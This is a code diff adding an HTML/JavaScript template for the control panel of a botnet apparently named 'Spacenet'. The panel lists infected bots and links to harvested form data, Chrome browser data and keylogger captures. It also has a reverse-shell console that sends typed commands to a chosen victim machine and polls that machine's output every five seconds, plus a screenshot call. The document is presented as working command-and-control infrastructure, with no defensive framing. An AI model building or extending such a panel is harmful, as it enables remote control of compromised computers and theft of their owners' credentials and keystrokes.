@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title>Spacenet | {{botid}}</title>
+	<link rel="icon" 
+      type="image/png" 
+      href="/static/images/icon.png">
+	<link rel="stylesheet" type="text/css" href="../static/css/styles.css">	
+</head>
+
+<body>
+<div class="cp_container">
+	
+<ul class="cp_bots_fx_ul">
+  <li class="cp_li"><a href="/cnc" style="all:unset;"><img src="/static/images/logo_spn.png" alt="logo" class="cp_logo"></a></li>
+  <li class="cp_li" style="float:right"><a href="../disconnect">Logout</a></li>
+</ul>
+	
+<ul class="cp_ul1_fx" >
+  <li class="cp_li1"><a href="/cnc">Overview</a></li>
+  <li class="cp_li1"><a class="active" href="list">Bots</a></li>
+  <li class="cp_li1"><a href="ossummary">Os</a></li>
+  <li class="cp_li1"><a href="dbpass">Database</a></li>
+  <li class="cp_li1"><a href="account">Account</a></li>
+  <br><hr><br>
+  <li class="cp_li1"><a href="getcache?botid={{botid}}">Grabbed forms</a></li>
+  <li class="cp_li1"><a href="chrome?botid={{botid}}">Chrome data</a></li>
+  <li class="cp_li1"><a href="keylogger?botid={{botid}}">Keylogger</a></li>
+  
+ 
+</ul>
+	
+<div class="cp_body" style="margin-top:4.9%;">
+<p class="cp_title">{{botid}}</p>
+<hr>
+	
+<p class="cp_title">Reverse shell</p>
+<pre id="terminal" style="width:80%;"></pre>
+
+<input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)" class="cp_bots_input" style="margin-left:0px;width:55%;"/>
+<button type="submit" onclick="send_command()" class="cp_bots_button" style="width:14%;">Send</button>
+
+       
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>
+function keypressed(e){
+	if(e.keyCode === 13){
+	send_command();
+	}
+	return false;
+}
+function send_command(e) {
+	$.post("../api/push", {'botid': '{{botid}}', 'cmd': $('#cmd').val()});
+	$('#cmd').val('');
+	return false;
+}
+function refresh_term() {
+	$('#terminal').load("../api/stdout?botid={{botid}}");
+	if (!$('#terminal').is(':hover')) {
+	   termdiv = document.getElementById('terminal');
+	   termdiv.scrollTop = termdiv.scrollHeight;
+	}
+
+}
+setInterval(refresh_term, 5000)
+$(document).ready(function(){
+	refresh_term();
+});
+   function Screenshots(e) {
+		$.post("../api/screens",{'hostname': '{{botid}}'});
+	}
+
+</script>
+ </body>
+</html>
